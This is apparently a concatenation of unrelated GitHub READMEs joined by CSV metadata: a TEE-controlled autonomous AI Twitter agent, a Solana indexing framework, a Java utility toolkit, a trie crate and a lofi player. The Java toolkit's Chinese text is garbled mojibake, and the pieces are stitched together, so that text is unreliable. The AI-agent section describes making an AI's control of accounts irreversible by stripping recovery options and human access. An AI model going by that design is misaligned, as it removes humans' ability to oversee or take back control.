- **Irrevocable Delegation**: Control transfer to AI must be technically irreversible

<img src=""https://github.com/user-attachments/assets/3dbb9729-30fe-4393-9aff-37b6a1999b57"" width=""50%""/>

## Technical Implementation
### TEE (Trusted Execution Environment) Approach:
- Uses hardware-based security to ensure tamper-resistant control
- Provides confidentiality and integrity guarantees
- Allows public verification through remote attestation

<img src=""https://github.com/user-attachments/assets/ccb25263-3ab0-4f0b-93b1-71298e23954f"" width=""75%""/>

### Account Setup and Delegation Process
1. TEE simulates a browser and requires email credentials
2. TEE verifies no recovery options exist on the email account
3. TEE generates new password and changes Cock.li email password
4. TEE logs into Twitter and generates new password
5. Changes linked email to the secured email from step 1
6. Removes phone numbers, connected apps, and existing sessions
7. Sets up local endpoint for OAuth token with read/write/DM scope
8. AI logs in via Twitter browser to get OAuth token

<img src=""https://github.com/user-attachments/assets/56d7e8a3-eccd-4df3-b283-5d0f98d8be38"" width=""75%""/>

### Security Features
- **Confidentiality**: Credentials stored only in TEE
- **Integrity**: TEE prevents code/data modification
- **Attestation**: Third-party verification possible
- **Timed Release**: 7-day recovery period for admin access

## Development
### Requirements
- Intel TDX-compatible hardware
  - Compatible BIOS version
  - The Dstack framework for running confidential VMs
- Docker
- Cock.li email account
- Twitter developer account
- Ethereum wallet setup capabilities

### Quick Start
1. Clone the repository
2. Set up Docker container
3. Configure TEE environment
4. Deploy autonomous agent

### Current Limitations
- Requires specific hardware (Intel TDX)
- Single point of failure (non-distributed)
- Relies on OpenRouter for foundation model queries

## Important Links
- TEE HEE Live on Twitter: https://x.com/tee_hee_he
- Code Repository: https://github.com/DamascusGit/nousflash
- Docker Hub: https://hub.docker.com/repository/docker/teeheehee/err_err_ttyl/general
- Additional Code: https://github.com/tee-he-he/err_err_ttyl
- Enclave Attestation: https://github.com/tee-he-he/err_err_ttyl/blob/main/quote.hex

## Contributors
- @ropirito
- @sxysun
- @socrates1024
- @karan4d
- @rpal_
- @dillonrolnick
",0,0,2,,,4.0
sevenlabs-hq/carbon,main,"# Carbon

Carbon is a lightweight indexing framework on Solana. It provides a modular pipeline for sourcing data, decoding updates and processing them in order to build end-to-end indexers.

## Components

### Pipeline

The core of the framework. It orchestrates data flow from data sources through indexing pipes.

### Datasources

A consumable datasource that will provide updates to the pipeline. These can either be `AccountUpdate`, `TransactionUpdate` or `AccountDeletion`.

### Pipes

Process specific updates:

- **Account Pipes** handle account updates. Each contains an `AccountDecoder` and a `Processor`.
- **Account Deletion Pipes** handle account deletions. Each contains a `Processor`.
- **Instruction Pipes** handle transaction updates, instruction by instruction. Each contains an `InstructionDecoder` and a `Processor`.
- **Transaction Pipes** handle transaction updates, after schema-matching the whole transaction. Each contains a `Schema` and a `Processor`.

### Metrics

Collect and report on pipeline performance and operational data.

Our premade metrics crates assist with common use cases:
| Crate Name | Description | Ease of Setup |
|------------|-------------|---------------|
| `carbon-log-metrics` | Logs useful program info to the terminal | Easy |
| `carbon-prometheus-metrics` | Provides a way of exporting default and custom metrics to a Prometheus server | Medium |

## Usage

### Basic Setup

```rs
use carbon_core::pipeline::Pipeline;
use carbon_rpc_block_subscribe_datasource::{RpcBlockSubscribe, Filters};
use solana_client::{
    rpc_config::{RpcBlockSubscribeConfig, RpcBlockSubscribeFilter},
};
use crate::{
    MyAccountDecoder, MyAccountProcessor,
    MyInstructionDecoder, MyInstructionProcessor,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let pipeline = Pipeline::builder()
        .datasource(
            RpcBlockSubscribe::new(
                env::var(""RPC_URL"")?,
                Filters::new(RpcBlockSubscribeFilter::MentionsAccountOrProgram(env::var(""MY_PROGRAM_ID"")?), None)
            )
        )
        .instruction(MyInstructionDecoder::new(), MyInstructionProcessor)
        .metrics(Arc::new(LogMetrics::new()))
        .build()?;

    pipeline.run().await?;

    Ok(())
}
```

### Generating Decoders from IDL

Decoders implementations allow the pipeline to input raw account or instruction data and to receive deserialized account or instruction data. They are the backbone of indexing with Carbon.

Carbon provides a CLI tool to generate decoders based on IDL files. This can significantly speed up the process of creating custom decoders for your Solana programs.

#### CLI Installation

You can install the Carbon CLI by downloading the pre-built binary for your operating system:

##### Linux

```sh
curl -LO https://github.com/sevenlabs-hq/carbon/releases/latest/download/carbon-cli-linux-amd64
chmod +x carbon-cli-linux-amd64
sudo mv carbon-cli-linux-amd64 /usr/local/bin/carbon-cli
```

##### macOS

```sh
curl -LO https://github.com/sevenlabs-hq/carbon/releases/latest/download/carbon-cli-macos-amd64
chmod +x carbon-cli-macos-amd64
sudo mv carbon-cli-macos-amd64 /usr/local/bin/carbon-cli
```

##### Windows

1. Download the latest release from https://github.com/sevenlabs-hq/carbon/releases/latest/download/carbon-cli-windows-amd64.exe
2. Rename the downloaded file to `carbon-cli.exe`
3. Move the file to a directory in your PATH

Alternatively, you can build from source using Cargo:

```sh
cargo install --git https://github.com/sevenlabs-hq/carbon.git carbon-cli
```

#### CLI Usage

```sh
$ carbon-cli parse [OPTIONS] --idl <IDL> --output <OUTPUT>
```

#### Options

- `-i, --idl <IDL>`: Path to the IDL json file.
- `-o, --output <OUTPUT>`: Path to the desired output directory.
- `-C, --as-crate`: Generate a directory or a crate.
- `-h, --help`: Print help information.

#### Example

To generate a decoder from an IDL file:

```sh
$ carbon-cli parse --idl my_program.json --output ./src/decoders
```

This will parse the my_program.json IDL file and generate the corresponding decoder code in the ./src/decoders directory.

### Implementing Processors

```rs
use carbon_core::account::{AccountDecoder, AccountMetadata, AccountProcessorInputType, DecodedAccount};
use crate::MyCustomAccountData;

struct MyAccountProcessor;

#[async_trait]
impl Processor for MyAccountProcessor {
    type InputType = AccountProcessorInputType<MyCustomAccountData>;

    async fn process(
        &mut self,
        input: Self::InputType,
        metrics: Arc<MetricsCollection>,
    ) -> CarbonResult<()> {
        // Implement processing logic
    }
}
```

### Implementing a Datasource

For most use cases, we recommend chosing from one of our datasource crates:
| Crate Name | Description | Affordability | Ease of Setup |
|------------|-------------|---------------|----------------|
| `carbon-block-subscribe` | Uses `blockSubscribe` with Solana WS JSON RPC to listen to real-time on-chain transactions | Cheap (just RPC) | Easy |
| `carbon-program-subscribe` | Uses `programSubscribe` with Solana WS JSON RPC to listen to real-time on-chain account updates | Cheap (just RPC) | Easy |
| `carbon-transaction-crawler` | Crawls historical successful transactions for a specific address in reverse chronological order using Solana JSON RPC | Cheap (just RPC) | Easy |
| `carbon-helius-atlas-ws` | Utilizes Helius Geyser-enhanced WebSocket for streaming account and transaction updates | Medium (Helius Plan) | Medium |
| `carbon-yellowstone-grpc` | Subscribes to a Yellowstone gRPC Geyser plugin enhanced full node to stream account and transaction updates | Expensive (Geyser Fullnode) | Complex |

You can still implement custom datasources in the following manner:

```rs
use carbon_core::datasource::{Datasource, Update, UpdateType};

struct MyDataSource;

#[async_trait]
impl Datasource for MyDataSource {
    async fn consume(
        &self,
        sender: &tokio::sync::mpsc::UnboundedSender<Update>,
        cancellation_token: CancellationToken,
    ) -> CarbonResult<()> {
        // Implement data fetching and sending logic
    }

    fn update_types(&self) -> Vec<UpdateType> {
        vec![UpdateType::AccountUpdate, UpdateType::Transaction]
    }
}
```

### Available Program Decoders

Decoders for most popular Solana programs are published and maintained:
| Crate Name | Description | Program ID |
|------------|-------------|------------|
| `carbon-jupiter-dca-decoder` | Jupiter DCA Program Decoder | DCA265Vj8a9CEuX1eb1LWRnDT7uK6q1xMipnNyatn23M |
| `carbon-jupiter-limit-order-decoder` | Jupiter Limit Order Program Decoder | jupoNjAxXgZ4rjzxzPMP4oxduvQsQtZzyknqvzYNrNu |
| `carbon-jupiter-limit-order-2-decoder` | Jupiter Limit Order 2 Program Decoder | j1o2qRpjcyUwEvwtcfhEQefh773ZgjxcVRry7LDqg5X |
| `carbon-jupiter-swap-decoder` | Jupiter Swap Program Decoder | JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4 |
| `carbon-meteora-dlmm-decoder` | Meteora DLMM Program Decoder | LBUZKhRxPF3XUpBCjp4YzTKgLccjZhTSDM9YuVaPwxo |
| `carbon-mpl-core-decoder` | MPL Core Program Decoder | CoREENxT6tW1HoK8ypY1SxRMZTcVPm7R94rH4PZNhX7d |
| `carbon-mpl-token-metadata-decoder` | MPL Token Metadata Program Decoder | metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s |
| `carbon-orca-whirlpool-decoder` | Orca Whirlpool Program Decoder | whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc |
| `carbon-pumpfun-decoder` | Pumpfun Program Decoder | 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P |
| `carbon-raydium-amm-v4-decoder` | Raydium AMM V4 Program Decoder | 675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8 |
| `carbon-system-program-decoder` | System Program Decoder | 11111111111111111111111111111111 |
| `carbon-token-program-decoder` | Token Program Decoder | TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA |
| `carbon-kamino-lend-decoder` | Kamino Lend Decoder | KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD |
| `carbon-kamino-vault-decoder` | Kamino Vault Decoder | kvauTFR8qm1dhniz6pYuBZkuene3Hfrs1VQhVRgCNrr |

## License

We are under the [MIT license](https://github.com/sevenlabs-hq/carbon/tree/main/LICENSE.md).
",1,0,64,MIT,cli.yml,71.0
JMagician/Magic,main,"<h1> 
    <a href=""https://magician-io.com"">Magic</a> ¬∑
    <img src=""https://img.shields.io/badge/licenes-MIT-brightgreen.svg""/>
    <img src=""https://img.shields.io/badge/jdk-17+-brightgreen.svg""/>
    <!-- <img src=""https://img.shields.io/badge/maven-3.5.4+-brightgreen.svg""/> -->
    <img src=""https://img.shields.io/badge/release-master-brightgreen.svg""/>
</h1>

MagicÊòØMagicianÊóó‰∏ãÁöÑ‰∏Ä‰∏™Â∑•ÂÖ∑ÂåÖÔºåÊîØÊåÅÂπ∂ÂèëÂ§ÑÁêÜ„ÄÅÁîü‰∫ßËÄÖ‰∏éÊ∂àË¥πËÄÖÊ®°Âûã„ÄÅÊï∞ÊçÆÂ∫ìÊìç‰ΩúÁ≠â

## ËøêË°åÁéØÂ¢É

JDK17

## ÊñáÊ°£

[https://magician-io.com/magic](https://magician-io.com/magic)

## Á§∫‰æã

### 01 ÂØºÂÖ•‰æùËµñ
```xml
<dependency>
    <groupId>com.github.yuyenews</groupId>
    <artifactId>Magic</artifactId>
    <version>1.0.2</version>
</dependency>
```

### 02 Êï∞ÊçÆÂ∫ìÊìç‰Ωú

#### È¶ñÂÖàÈúÄË¶ÅÂàõÂª∫‰∏Ä‰∏™SpringÁöÑJdbcTemplateÂØπË±°

```java
@Resource
private JdbcTemplate jdbcTemplate;
```

#### ÂçïË°®Êü•ËØ¢

```java
// ÂàõÂª∫Êü•ËØ¢Êù°‰ª∂
ConditionBuilder conditionBuilder = ConditionBuilder.createCondition()
                .add(""age = ?"", ""300"")
                .add("" order by age desc"", Condition.NOT_WHERE);

// ÊâßË°åÊü•ËØ¢Êìç‰Ωú
List<DemoPO> demoPOS = MagicDBUtils.get(jdbcTemplate)
        .select(""m_user_info"", conditionBuilder, DemoPO.class);
```

#### ÂçïË°®ÊèíÂÖ•

```java
// ÂàõÂª∫Ë¶ÅÊèíÂÖ•ÁöÑÂØπË±°ÂíåÂÄº
DemoPO demoPO = DemoPO.builder()
                    .id(UUID.randomUUID().toString())
                    .age(18)
                    .content(""ÂìàÂìàÂìà"")
                    .amount(new BigDecimal(""10000""))
                    .length(new BigInteger(""10000000000""))
                    .createTime(new Date())
                    .updateTime(new Date())
                    .build();

// ÊâßË°åÊèíÂÖ•Êìç‰Ωú
MagicDBUtils.get(jdbcTemplate).insert(""m_user_info"", demoPO);
```

#### ÂçïË°®Êõ¥Êñ∞

```java
// ÂàõÂª∫‰øÆÊîπÊù°‰ª∂
ConditionBuilder = conditionBuilder = ConditionBuilder.createCondition()
                .add(""id = ? and age = ?"", ""00df4362-d7ad-48d2-8bcb-05cf859b7e64"", 500);

// ÈúÄË¶Å‰øÆÊîπÁöÑÂ≠óÊÆµÂíåÂØπÂ∫îÁöÑÂÄº
DemoPO demoPO = DemoPO.builder()
        .age(122)
        .content(""ÂòøÂòøÂòø"")
        .amount(new BigDecimal(""100002.33""))
        .length(new BigInteger(""100000000002""))
        .createTime(new Date())
        .updateTime(new Date())
        .build();

// ÊâßË°å‰øÆÊîπÊìç‰Ωú
MagicDBUtils.get(jdbcTemplate).update(""m_user_info"", demoPO, conditionBuilder);
```

#### ÂçïË°®Âà†Èô§

```java
// ÂàõÂª∫Âà†Èô§Êù°‰ª∂
ConditionBuilder = conditionBuilder = ConditionBuilder.createCondition()
                .add(""id = ?"", ""00df4362-d7ad-48d2-8bcb-05cf859b7e64"");
// ÊâßË°åÂà†Èô§Êìç‰Ωú
MagicDBUtils.get(jdbcTemplate).delete(""m_user_info"", conditionBuilder);
```

#### Ëá™ÂÆö‰πâSQLÊü•ËØ¢

```java
DemoPO demoPO = DemoPO.builder()
                .age(122)
                .build();

MagicDBUtils.get(jdbcTemplate).selectList(""select * from m_user_info where age > {age}"", demoPO, DemoPO.class);
```

#### Ëá™ÂÆö‰πâSQLÂàÜÈ°µ

```java
// Êü•ËØ¢ÂèÇÊï∞
PageParamModel pageParamModel = PageParamModel
                .getPageParamModel(1, 10)
                        .setParam(
                                DemoPO.builder()
                                    .age(10)
                                    .build()
                        );

// ÊâßË°åÊü•ËØ¢Êìç‰Ωú
PageModel<DemoPO> pageModel = MagicDBUtils.get(jdbcTemplate).selectPage(""select * from m_user_info where age > {age}"", pageParamModel, DemoPO.class);
```

### 03 Âπ∂ÂèëÂ§ÑÁêÜ‰ªªÂä°

```java
MagicDataProcessing.getConcurrentTaskSync()
                .setTimeout(1000) // Ë∂ÖÊó∂Êó∂Èó¥
                .setTimeUnit(TimeUnit.MILLISECONDS) // Ë∂ÖÊó∂Êó∂Èó¥ÁöÑÂçï‰Ωç
                .add(() -> { // Ê∑ªÂä†‰∏Ä‰∏™‰ªªÂä°

                    // Âú®ËøôÈáåÂèØ‰ª•ÂÜô‰∏ä‰ªªÂä°ÁöÑ‰∏öÂä°ÈÄªËæë

                }, (result, e) -> {
                    // Ê≠§‰ªªÂä°Â§ÑÁêÜÂêéÁöÑÂõûË∞É
                    if(result.equals(ConcurrentTaskResultEnum.FAIL)){
                        // ‰ªªÂä°Â§±Ë¥•ÔºåÊ≠§Êó∂eÈáåÈù¢ÊúâËØ¶ÁªÜÁöÑÂºÇÂ∏∏‰ø°ÊÅØ
                    } else if(result.equals(ConcurrentTaskResultEnum.SUCCESS)) {
                        // ‰ªªÂä°ÊàêÂäüÔºåÊ≠§Êó∂eÊòØÁ©∫ÁöÑ
                    }
                })
                .add(() -> { // Ê∑ªÂä†‰∏Ä‰∏™‰ªªÂä°

                    // Âú®ËøôÈáåÂèØ‰ª•ÂÜô‰∏ä‰ªªÂä°ÁöÑ‰∏öÂä°ÈÄªËæë

                }, (result, e) -> {
                    // Ê≠§‰ªªÂä°Â§ÑÁêÜÂêéÁöÑÂõûË∞É
                    if(result.equals(ConcurrentTaskResultEnum.FAIL)){
                        // ‰ªªÂä°Â§±Ë¥•ÔºåÊ≠§Êó∂eÈáåÈù¢ÊúâËØ¶ÁªÜÁöÑÂºÇÂ∏∏‰ø°ÊÅØ
                    } else if(result.equals(ConcurrentTaskResultEnum.SUCCESS)) {
                        // ‰ªªÂä°ÊàêÂäüÔºåÊ≠§Êó∂eÊòØÁ©∫ÁöÑ
                    }
                })
                .start();
```

### 04 Âπ∂ÂèëÂ§ÑÁêÜListÔºåSetÁ≠âÊâÄÊúâCollectionÁ±ªÈõÜÂêàÈáåÁöÑÂÖÉÁ¥†

```java
// ÂÅáÂ¶ÇÊúâ‰∏Ä‰∏™ListÈúÄË¶ÅÂπ∂ÂèëÂ§ÑÁêÜÈáåÈù¢ÁöÑÂÖÉÁ¥†
List<String> dataList = new ArrayList<>();

// Âè™ÈúÄË¶ÅÂ∞Ü‰ªñ‰º†ÂÖ•syncRunnerÊñπÊ≥ïÂç≥ÂèØÔºåÊØè‰∏™ÂèÇÊï∞ÁöÑÂÖ∑‰ΩìÂê´‰πâÂèØ‰ª•ÂèÇËÄÉÊñáÊ°£
MagicDataProcessing.getConcurrentCollectionSync()
        .syncRunner(dataList, data -> {

            // ËøôÈáåÂèØ‰ª•ÊãøÂà∞ListÈáåÁöÑÂÖÉÁ¥†ÔºåËøõË°åÂ§ÑÁêÜ
            System.out.println(data);
        
        }, 10, 1, TimeUnit.MINUTES);

// ‰πüÂèØ‰ª•Áî®syncGroupRunnerÊñπÊ≥ïÔºåÊØè‰∏™ÂèÇÊï∞ÁöÑÂÖ∑‰ΩìÂê´‰πâÂèØ‰ª•ÂèÇËÄÉÊñáÊ°£
MagicDataProcessing.getConcurrentCollectionSync()
        .syncGroupRunner(dataList, data -> {

            // ËøôÈáåÊòØÊØè‰∏ÄÁªÑList
            for(String item : data){
                // ËøôÈáåÂèØ‰ª•ÊãøÂà∞ListÈáåÁöÑÂÖÉÁ¥†ÔºåËøõË°åÂ§ÑÁêÜ
                System.out.println(data);
            }
        
        }, 10, 1, TimeUnit.MINUTES);
```

### 05 Áîü‰∫ßËÄÖ‰∏éÊ∂àË¥πËÄÖ

```java
// ÂàõÂª∫‰∏ÄÁªÑÁîü‰∫ßËÄÖ‰∏éÊ∂àË¥πËÄÖÔºåÊîØÊåÅÂ§öÂØπÂ§ö
MagicDataProcessing.getProducerAndConsumerManager()
        .addProducer(new MagicianProducer() { // Ê∑ªÂä†‰∏Ä‰∏™Áîü‰∫ßËÄÖÔºàÂèØ‰ª•Ê∑ªÂä†Â§ö‰∏™Ôºâ
            
            @Override
            public void producer() {
                // Êü•ËØ¢ËøôÂº†Ë°®ÈáåÁ¨¶ÂêàÊù°‰ª∂ÁöÑÊï∞ÊçÆ
                List<Object> dataList = selectList();
        
                // ÁÑ∂ÂêéÂ∞Ü‰ªñÊé®ÈÄÅÁªôÊ∂àË¥πËÄÖ
                this.publish(dataList);
            }
            
        }).addConsumer(new MagicianConsumer() { // Ê∑ªÂä†‰∏Ä‰∏™Ê∂àË¥πËÄÖÔºàÂèØ‰ª•Ê∑ªÂä†Â§ö‰∏™Ôºâ
            
            @Override
            public void doRunner(Object data) {
                // Â§ÑÁêÜÁîü‰∫ßËÄÖÂèëÊù•ÁöÑÊï∞ÊçÆ
                System.out.println(data);
            }
            
        }).start();
```",0,1,2,MIT,,0.0
cloudflare/trie-hard,main,"[![Crates.io](https://img.shields.io/crates/v/trie-hard.svg)](https://crates.io/crates/trie-hard)
[![Documentation](https://docs.rs/trie-hard/badge.svg)](https://docs.rs/trie-hard/)

# Don't just Trie, Trie Hard

This crate is an implementation of the [trie](https://en.wikipedia.org/wiki/Trie) data structure that is optimized for reading from small maps where a large number of misses are expected. This is still a work in progress in the sense that as none of the other features you would expect to find in a trie (like prefix search), but it is used in production in Cloudflare's [Pingora](https://blog.cloudflare.com/pingora-open-source) to detect and remove specific headers from 30 million requests every second before they are proxied to their final destinations.

## Performance

There are several other trie implementations for rust that are more full-featured, so if you are looking for a more robust tool, you will probably want to check out [`radix_trie`](https://crates.io/crates/radix_trie) which seems to have the best features and performance. On the other hand, if you want raw speed and have the same narrow use case, you came to the right place!

Here is a chart showing the time taken to read 10k entries from a map that consists of 119 entries containing only lower-case characters, numbers, and `-`. As you can see, when miss rate gets above 50% the performance of trie-hard surpasses `std::HashMap` and improves as miss rates get higher. 

![Trie Hard read is faster than HashMap for small maps where miss rate is high](https://github.com/cloudflare/trie-hard/blob/main/resources/HeadersVsHashMap.png?raw=true ""Header Read vs HashMap Benchmark"")

The improvement of performance as miss rate grows is one of the features of tries, and you can see the same trend in the performance of `radix-trie`. 

![Trie Hard read is faster than RadixTrie but follows the same curve](https://github.com/cloudflare/trie-hard/blob/main/resources/HeadersVsRadixTrie.png?raw=true ""Header Read vs RadixTrie Benchmark"")

This also shows the difference in performance between radix-trie and trie-hard, but this should not be interpreted as a reason to use trie-hard over radix-trie. radix-trie is a full-featured trie and balances the read performance with write performance. For fairness, here is a breakdown of the loading performance of the two trie implementations.

| Item       | Time to load 15.5k words |
| ---------- | ------------------------ |
| Trie Hard  | 11.92 ms                 |
| Radix Trie | 3.49 ms                  |

For insertion radix is ~3x times faster and also supports incremental changes whereas trie-hard is only designed for bulk loading.

## How Does it Work?

Trie Hard achieves its speed in 2 ways.

1. All node and edge information is kept in contiguous regions on the heap. This prevents jumping around in memory during gets, and maximizes the chance of child nodes already appearing in cache.
2. Relationships between nodes and edges is encoded into individual bits in unsigned integers.

### Example

Let's say we want to store the (uninteresting) strings, ""and"", ""ant"", ""dad"", ""do"", ""dot"" in our trie. Let's work through an example of how the data is organized and how we can read from it.

#### Construction

Trie-hard only supports bulk loading so, we run 

```rust
let trie = [""and"", ""ant"", ""dad"", ""do"", ""dot""].into_iter().collect::<TrieHard<'_, _>>();
```

The first thing trie-hard does is find all the used bytes in the entries. It assigns each a unique 1-bit mask. For our simple case, this will look like

| Byte   | Mask      |
| ------ | --------- |
| `b'a'` | `0b00001` |
| `b'd'` | `0b00010` |
| `b'n'` | `0b00100` |
| `b'o'` | `0b01000` |
| `b't'` | `0b10000` |

The number of masks required determines the underlying integer type used to represent the mask. In our case, we only have 5 bits, so the underlying type will be `u8`. The implication of needing a bit for each unique byte is that potentially we would require a 256-bit integer (`u256`), so an implementation of `U256` is provided as part of this crate. _Note_ The `U256` type should not be used directly. It only implements (and tests) the few operations needed to work with `trie-hard`. The use case `trie-hard` was designed for only needs to support at most 37 unique bytes, but in practice only 30 unique bytes appear in the stored map. This means we are storing our underlying tree information in `u32`s.

Next we will construct the graph representing the tree starting with the bytes that appear first in the input strings. Only `a` and `d` appear in the first position, so for the node representing the first byte (and also the root of the trie), we create a mask indicating only `a` and `d` are allowed.

```rust
let root = Node {
    // a (0b00001) + d (0b00010) = 0b00011
    mask: 0b11,
    // ..
}
```

This tells us that if a byte other than `a` or `d` appears in the first position, the key being tested does not appear in the trie. This ability to make an exclusion decision at every step is what makes tries more appealing than even hashmaps in some cases. Searching for a string in a hashmap requires hashing the entire string whereas a trie can potentially determine that a string is not part of a set within a single byte.

If the byte is `a` or `d` we still need to know which node to go to next. All nodes in the graph are stored in a contiguous vector (with the root node at index zero). Each node will contain the information on where its child appears in the array of nodes. In our example the root node will point to nodes with indexes 1 and 2. Where 1 is the index with keys starting with `a` and 2 is the node for keys starting with `d`. It is important that these child nodes are ordered by their corresponding byte. 

```rust
let root = Node {
    mask: 0b11,
    // 1 -> keys that start with b'a'
    // 2 -> keys that start with b'd'
    children: vec![1, 2],
    // ..
}
```

> _Note_. In the final map, the child indices are not stored in per-node vecs. They are instead stored in a central vec, and only the index into that vec corresponding with this node is stored in the node.

At this point we can visualize the conceptual trie and trie-hard like this

| Conceptual                                                                                                                                                    | Trie-Hard                                                                                                                                                                                                       |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ![First Layer Conceptual Trie](https://github.com/cloudflare/trie-hard/blob/main/resources/FirstLayerVanilla.png?raw=true ""Header Read vs HashMap Benchmark"") | ![Trie Hard read is faster than HashMap for small maps where miss rate is high](https://github.com/cloudflare/trie-hard/blob/main/resources/FirstLayerTrieHard.png?raw=true ""Header Read vs HashMap Benchmark"") |

Because of the recursive nature of a trie, we can repeat the same process of creating a mask based on allowed bytes at each node and preparing a set of children for each node. When we reach a complete word that appears in the initial set, we need to signify that the node is a valid word. Visually we will mark them with green, but in rust they just appear as a different enum variant of `TrieNode`.

After repeating for one more layer, we can visualize the trie like the this.

| Conceptual                                                                                                                                                     | Trie-Hard                                                                                                                                                                                                        |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ![First Layer Conceptual Trie](https://github.com/cloudflare/trie-hard/blob/main/resources/SecondLayerVanilla.png?raw=true ""Header Read vs HashMap Benchmark"") | ![Trie Hard read is faster than HashMap for small maps where miss rate is high](https://github.com/cloudflare/trie-hard/blob/main/resources/SecondLayerTrieHard.png?raw=true ""Header Read vs HashMap Benchmark"") |

Notice that `do` shows up as green because it is a complete word found in the original collection.

Finally, we add the last layer and complete this small trie.


| Conceptual                                                                                                                                          | Trie-Hard                                                                                                                                                                                             |
| --------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ![First Layer Conceptual Trie](https://github.com/cloudflare/trie-hard/blob/main/resources/Vanilla.png?raw=true ""Header Read vs HashMap Benchmark"") | ![Trie Hard read is faster than HashMap for small maps where miss rate is high](https://github.com/cloudflare/trie-hard/blob/main/resources/TrieHard.png?raw=true ""Header Read vs HashMap Benchmark"") |

#### Reading 

When reading from the trie, we are checking a key to see if it is contained in the trie. As stated earlier, the benefit of a trie is that it lets lookups fail as fast as possible. Let's walk through the process of reading from trie-hard to see why. 

Trie's work on a per-byte basis, so each step of the read process takes a single byte from the input key, and checks the current node in the trie to see if is allowed. The first thing we do with the input byte is convert it from its `u8` value into its mask using the lookup table we created while constructing the trie. Let's say we want to do a lookup `dot`. We start with the first byte `d` and the current (root) node. 

`d` converts to a mask of `00010`. To determine if `d` is allowed in the root node, we take a bit-wise `&` of their masks. If the result > 0, then the byte is allowed. The mask for the root node is `00011`, and `00011 & 00010 = 00010 > 0`, so `d` is allowed. 

Next we need to determine which node to traverse for our input. This involves some more bit-wise arithmetic in the form of this **_one weird trick_**. We can count the number of set bits in the node's mask that are less-significant than the set bit in the input byte's mask. The number of set bits gives us the index in to the array of children. The formula/rust code for this is below. Notice it uses all bit-wise operations and intrinsics, so this operation equates to just a few cpu instructions in the compiled code.

```rust
let child_index = ((input_mask - 1) & node.mask).count_ones()
```

Applying this formula to our current input mask and node, we get

```rust
//            ((input_mask - 1) & node.mask).count_ones()              
child_index = ((  0b00010  - 1) &  0b00011 ).count_ones() // = 1
```

The next node is the one at **index = 1** in the current node's child array.

The reason this works may actually easier to understand with a larger example. Consider this node from a larger trie (unrelated to our original example).

```rust
TrieNode {
    // bits for - n   h  fd  a
    mask: 0b000000100010011001,
    // 5 possible children for 5 set bits in mask
    children: [
        3,  // <-- a
        6,  // <-- d
        9,  // <-- f
        10, // <-- h
        12  // <-- n
    ]
}
```

If we want to know which child to go to after receiving the byte `h`, we first need `h`'s mask = `000000000010000000`. Now if we step through the formula we see that subtracting 1 from the `h`'s mask gives us:

```
    000000000010000000
  -                  1
 ----------------------
    000000000001111111
```
Notice this gives us a new mask where _all_ bit with lower significance than `h`'s are set. Continuing to follow the formula, we apply a big-wise `&` between the new mask and the node's mask, we get:

```

    000000100010011001
  & 000000000001111111
 ----------------------
    000000000000011001
```

The bits in this new mask are exactly what we wanted: only the set bits from the node's mask that have a lower significance than `h`'s. The last step is to call [`count_ones`](https://doc.rust-lang.org/std/primitive.u32.html#method.count_ones) which is provided as an intrinsic by llvm. This gives us the answer of **3**.

Going back to our original example, we now repeat the same steps for the next input byte and the new current node. This process continues until we run out of input or encounter a node that will not accept the current byte. 
",0,2,1,Apache-2.0,"audit.yml,build.yml,docs.yml,mark-stale.yaml,semgrep.yml",10.0
talwat/lowfi,main,"# lowfi

lowfi is a tiny rust app that serves a single purpose: play lofi.
It'll do this as simply as it can: no albums, no ads, just lofi.

![example image](media/example1.png)

## Disclaimer

**All** of the audio files played in lowfi are from [Lofi Girl's](https://lofigirl.com/) website,
under their [licensing guidelines](https://form.lofigirl.com/CommercialLicense).

If god forbid you're planning to use this in a commercial setting, please
follow their rules.

## Why?

I really hate modern music platforms, and I wanted a small, ""suckless""
app that would literally just play lofi without video so I could use it
whenever.

I also wanted it to be fairly resiliant to inconsistent networks,
so it buffers 5 whole songs at a time instead of parts of the same song.

Although, lowfi is yet to be properly tested in difficult conditions,
so don't rely on it too much until I do that. See [Scraping](#scraping) if
you're interested in downloading the tracks. Beware, there's a lot of them.

## Installing

> [!NOTE]
>
> If you're interested in maintaining a package for `lowfi`
> on package managers such as homebrew and the like, open an issue.

### Dependencies

You'll need Rust 1.74.0+.

On MacOS & Windows, no extra dependencies are needed.

On Linux, you'll also need openssl & alsa, as well as their headers.

- `alsa-lib` on Arch, `libasound2-dev` on Ubuntu.
- `openssl` on Arch, `libssl-dev` on Ubuntu.

Make sure to also install `pulseaudio-alsa` if you're using pulseaudio.

### Cargo

The recommended installation method is to use cargo:

```sh
cargo install lowfi

# If you want MPRIS support.
cargo install lowfi --features mpris
```

and making sure `$HOME/.cargo/bin` is added to `$PATH`.

### Release Binaries

If you're struggling or unwilling to use cargo, you can just download
precompiled binaries from the [latest release](https://github.com/talwat/lowfi/releases/latest).

### AUR

If you're on Arch, you can also use the AUR:

```sh
yay -S lowfi
```

### openSUSE

```sh
zypper install lowfi
```

### Manual

This is good for debugging, especially in issues.

```sh
git clone https://github.com/talwat/lowfi
cd lowfi

# If you want an actual binary
cargo build --release --all-features
./target/release/lowfi

# If you just want to test
cargo run --all-features
```

## Usage

`lowfi`

Yeah, that's it.

### Controls

| Key   | Function       |
|-------|----------------|
|  `s`  | Skip song      |
|  `p`  | Play/Pause     |
| `+/-` | Volume Up/Down |
|  `q`  | Quit           |

### Extra Flags

If you have something you'd like to tweak about lowfi, you can run `lowfi help`
to view the available options.

### Scraping

lowfi also has a `scrape` command which is usually not relevant, but
if you're trying to download some files from Lofi Girls' website,
it can be useful.

An example of scrape is as follows,

`lowfi scrape --extension zip --include-full`

where more information can be found by running `lowfi help scrape`.

### Custom Track Lists

> [!WARNING]
